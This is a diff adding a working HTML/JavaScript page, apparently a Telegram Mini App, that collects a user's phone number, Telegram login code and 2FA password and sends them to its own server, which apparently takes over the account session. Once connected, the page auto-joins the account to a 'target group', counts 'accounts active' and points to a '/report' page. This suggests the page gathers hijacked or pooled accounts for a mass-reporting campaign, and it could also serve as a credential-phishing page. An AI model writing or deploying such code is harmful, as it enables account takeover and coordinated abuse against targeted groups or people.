@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Add Account</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+body { min-height:100vh; background:#0a0e14; display:flex; align-items:center; justify-content:center; padding:20px; color:#fff; }
+.box { width:100%; max-width:400px; background:#17212b; border-radius:20px; padding:28px; border:1px solid #2b3945; }
+h2 { text-align:center; margin-bottom:8px; }
+p { color:#8e9fad; text-align:center; font-size:0.85rem; margin-bottom:24px; }
+label { display:block; color:#8e9fad; font-size:0.8rem; margin-bottom:6px; margin-top:14px; }
+input { width:100%; background:#242f3d; border:1px solid #2b3945; border-radius:12px; padding:14px; color:#fff; font-size:1rem; outline:none; }
+input:focus { border-color:#4c9ce0; }
+button { width:100%; padding:16px; border:none; border-radius:12px; font-size:1rem; font-weight:600; cursor:pointer; margin-top:16px; transition:0.2s; }
+.btn-primary { background:linear-gradient(135deg,#8a2be2,#ff1493); color:white; }
+.btn-primary:hover:not(:disabled) { transform:translateY(-1px); }
+.btn-primary:disabled { opacity:0.5; cursor:not-allowed; }
+.btn-secondary { background:#2b3945; color:#6ab2f2; margin-top:10px; }
+.err { background:rgba(255,68,68,0.15); color:#ff6b6b; padding:10px 14px; border-radius:10px; font-size:0.85rem; margin-bottom:12px; display:none; border-left:3px solid #ff4444; }
+.err.show { display:block; }
+.success { background:rgba(32,178,170,0.15); color:#20b2aa; padding:10px 14px; border-radius:10px; font-size:0.85rem; margin-bottom:12px; display:none; border-left:3px solid #20b2aa; }
+.success.show { display:block; }
+.code-row { display:flex; gap:8px; justify-content:center; margin:20px 0; }
+.code-box { width:52px; height:64px; background:rgba(255,255,255,0.05); border:2px solid #2b3945; border-radius:12px; text-align:center; font-size:1.8rem; font-weight:700; color:#fff; line-height:60px; transition:0.2s; }
+.code-box.filled { border-color:#8a2be2; background:rgba(138,43,226,0.15); }
+.code-box.active { border-color:#ff1493; animation:pulse 1.5s infinite; }
+@keyframes pulse { 0%,100%{border-color:#ff1493} 50%{border-color:#8a2be2} }
+.hidden-input { position:absolute; opacity:0; width:1px; height:1px; }
+.spinner { display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,0.3); border-radius:50%; border-top-color:white; animation:spin 0.6s linear infinite; margin-right:6px; vertical-align:middle; }
+@keyframes spin { to{transform:rotate(360deg)} }
+</style>
+</head>
+<body>
+<div class="box">
+  <!-- Page 1: Phone -->
+  <div id="page1">
+    <h2>🔐 Add Telegram Account</h2>
+    <p>Enter your phone number with country code</p>
+    <div class="err" id="err1"></div>
+    <div class="success" id="succ1"></div>
+    <label>Phone number</label>
+    <input type="tel" id="phone" placeholder="+251912345678" autocomplete="tel">
+    <button class="btn-primary" id="sendBtn" onclick="sendCode()">Send Code</button>
+  </div>
+
+  <!-- Page 2: Code -->
+  <div id="page2" style="display:none">
+    <h2>📱 Verify Code</h2>
+    <p id="phoneHint">Enter the code from Telegram</p>
+    <div class="err" id="err2"></div>
+    <input type="text" id="hiddenCode" class="hidden-input" maxlength="5" inputmode="numeric">
+    <div class="code-row" id="codeRow" onclick="document.getElementById('hiddenCode').focus()">
+      <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
+      <div class="code-box"></div><div class="code-box"></div>
+    </div>
+    <div id="passGroup" style="display:none">
+      <label>2FA Password</label>
+      <input type="password" id="password" placeholder="Enter 2FA password">
+    </div>
+    <button class="btn-primary" id="verifyBtn" onclick="verifyCode()">Verify & Connect</button>
+    <button class="btn-secondary" onclick="backToPhone()">← Back</button>
+  </div>
+
+  <!-- Page 3: Success -->
+  <div id="page3" style="display:none; text-align:center">
+    <div style="font-size:4rem; margin:10px 0">✅</div>
+    <h2 style="color:#20b2aa">Account Connected!</h2>
+    <p id="successInfo">Auto-joining target group...</p>
+    <button class="btn-primary" onclick="window.location.href='/report'">🚨 Go to Report</button>
+    <button class="btn-secondary" onclick="addAnother()">➕ Add Another</button>
+  </div>
+</div>
+
+<script>
+let sessionId = null;
+let maskedPhone = '';
+const boxes = document.querySelectorAll('.code-box');
+const hidden = document.getElementById('hiddenCode');
+
+function showErr(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 6000);
+}
+function showSucc(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 5000);
+}
+
+async function sendCode() {
+  const phone = document.getElementById('phone').value.trim();
+  if (!phone) { showErr('err1', 'Enter phone number'); return; }
+  const btn = document.getElementById('sendBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Sending...';
+  try {
+    const r = await fetch('/api/send-code', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({phone})
+    });
+    const d = await r.json();
+    if (d.success) {
+      sessionId = d.session_id;
+      maskedPhone = d.phone_masked;
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'block';
+      document.getElementById('phoneHint').textContent = 'Code sent to ' + maskedPhone;
+      resetCode();
+      setTimeout(() => hidden.focus(), 300);
+    } else {
+      showErr('err1', d.error || 'Failed to send code');
+    }
+  } catch(e) {
+    showErr('err1', 'Connection error');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Send Code';
+  }
+}
+
+function resetCode() {
+  hidden.value = '';
+  boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled','active'); });
+  boxes[0].classList.add('active');
+}
+
+hidden.addEventListener('input', () => {
+  let v = hidden.value.replace(/[^0-9]/g, '').slice(0, 5);
+  hidden.value = v;
+  boxes.forEach((b, i) => {
+    b.textContent = v[i] || '';
+    b.classList.toggle('filled', i < v.length);
+    b.classList.toggle('active', i === v.length);
+  });
+  if (v.length === 5) setTimeout(autoVerify, 250);
+});
+
+hidden.addEventListener('paste', e => {
+  e.preventDefault();
+  const t = (e.clipboardData || window.clipboardData).getData('text');
+  hidden.value = t.replace(/[^0-9]/g, '').slice(0, 5);
+  hidden.dispatchEvent(new Event('input'));
+});
+
+async function autoVerify() {
+  const code = hidden.value;
+  if (code.length !== 5) return;
+  const needPass = document.getElementById('passGroup').style.display === 'block';
+  if (!needPass) verifyCode();
+}
+
+async function verifyCode() {
+  const code = hidden.value;
+  if (code.length !== 5) { showErr('err2', 'Enter 5-digit code'); return; }
+  const password = document.getElementById('password').value || undefined;
+  const btn = document.getElementById('verifyBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Verifying...';
+  try {
+    const r = await fetch('/api/verify-code', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({session_id: sessionId, code, password})
+    });
+    const d = await r.json();
+    if (d.success) {
+      document.getElementById('page2').style.display = 'none';
+      document.getElementById('page3').style.display = 'block';
+      document.getElementById('successInfo').textContent =
+        (d.account ? d.account.name : 'Account') + ' — auto-joining group...';
+      setTimeout(async () => {
+        try {
+          const hr = await fetch('/api/health');
+          const hd = await hr.json();
+          document.getElementById('successInfo').textContent =
+            '✅ Connected! ' + (hd.accounts || 0) + ' accounts active';
+        } catch(e){}
+      }, 4000);
+    } else if (d.need_password) {
+      document.getElementById('passGroup').style.display = 'block';
+      document.getElementById('password').focus();
+      showErr('err2', '2FA password required');
+      btn.disabled = false;
+      btn.textContent = 'Verify & Connect';
+    } else {
+      showErr('err2', d.error || 'Verification failed');
+      resetCode();
+      btn.disabled = false;
+      btn.textContent = 'Verify & Connect';
+    }
+  } catch(e) {
+    showErr('err2', 'Connection error');
+    btn.disabled = false;
+    btn.textContent = 'Verify & Connect';
+  }
+}
+
+function backToPhone() {
+  document.getElementById('page2').style.display = 'none';
+  document.getElementById('page1').style.display = 'block';
+  sessionId = null;
+}
+
+function addAnother() {
+  document.getElementById('page3').style.display = 'none';
+  document.getElementById('page1').style.display = 'block';
+  document.getElementById('phone').value = '';
+  sessionId = null;
+}
+</script>
+</body>
+</html>
